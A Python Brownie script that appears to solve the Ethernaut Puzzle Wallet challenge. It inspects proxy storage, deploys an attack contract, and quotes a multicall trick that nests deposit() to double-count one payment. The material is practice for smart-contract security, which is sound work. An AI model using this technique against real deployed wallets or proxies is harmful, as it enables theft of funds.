from scripts.helpful_scripts import get_account
from brownie import web3, network, interface, convert, Attack24, PuzzleWallet, PuzzleProxy, Contract
from eth_utils import keccak

ETHERNAUT_INSTANCE = "0x2F580FeD8ABe9B2b1965Bf38a3c344B96e0938eF"
PLAYER = "0xF8f8269488f73fab3935555FCDdD6035699deE25"
GAS_LIMIT = 6000000
VALUE = "0.001 ether"

def initialise(_player, _target):
    print(f"\nplayer address = {_player}")
    print(f"target = {_target}")
    proxy = Contract.from_abi(PuzzleProxy._name, ETHERNAUT_INSTANCE, PuzzleProxy.abi)
    print(f"PuzzleProxy.pendingAdmin() = {proxy.pendingAdmin()}")
    print(f"PuzzleProxy.admin() = {proxy.admin()}")

def contract_total_balance():
     # current balance of PuzzleProxy
    balance = web3.eth.getBalance(ETHERNAUT_INSTANCE)
    balance_eth = web3.fromWei(balance, "ether")
    print(f"\nContract total balance in wei = {balance}\nbalance in ether = {balance_eth}\n")

def print_storage(_player, _target):
    print("\n---------------- START -----------------")
    for i in range(2):
        storage_slot = web3.eth.getStorageAt(ETHERNAUT_INSTANCE, i)
        storage_slot_hex = web3.toHex(storage_slot)
        print(f"storage slot {i}:  {storage_slot_hex}") # slot 0/slot 1 --> (proxy) admin addresses
    player_WL = _target.whitelisted(_player, {"from": _player})
    print(f"Player address on the whitelist: {player_WL}") 
    print("----------------- END ------------------\n")
       
"""
    0x725595ba16e76ed1f6cc1e1b65a88365cc494824  <- admin address at start

    Function to print the following status message:

    ---------------- START -----------------

    Admin address:    {address}     <-- get these addresses by viewing the storage slots
    Owner address:    {address}     
    Address0 WL:      {true/false}  <-- address0 - address that added 0.001 eth (whitelisted)
    Address1 WL:      {true/false}  <-- address1 - player address (not initially whitelisted)
    Address0 balance: {uint}
    Address1 balance: {uint}
    Total balance:    {uint}
    
    ----------------- END ------------------    
"""

def main():

    # initalise player, target etc.    
    player = get_account()
    target = interface.IPuzzleWallet(ETHERNAUT_INSTANCE)
    initialise(player, target)
    
    print_storage(player, target)
            
    attack = Attack24.deploy(ETHERNAUT_INSTANCE, {"from": player, "gas_limit": GAS_LIMIT})

    attack.attack({"from": player, "gas_limit": GAS_LIMIT, "value": VALUE})
    # print_storage(player, target)



"""
from Github solution 

# method id for the first deposit() call
deposit_hash = web3.keccak(text="deposit()")[:4].hex() 
# here we encode the calldata to call multicall with one argument, the deposit() call
multicall_deposit_calldata = ETHERNAUT_INSTANCE.multicall.encode_input([deposit_hash]) 
# we can now packed those two calldata together to have the final argument to give to multicall
data = [deposit_hash, multicall_deposit_calldata]  

ETHERNAUT_INSTANCE.multicall(data, {"from": player, "value": 0.02 ether})  # python

"""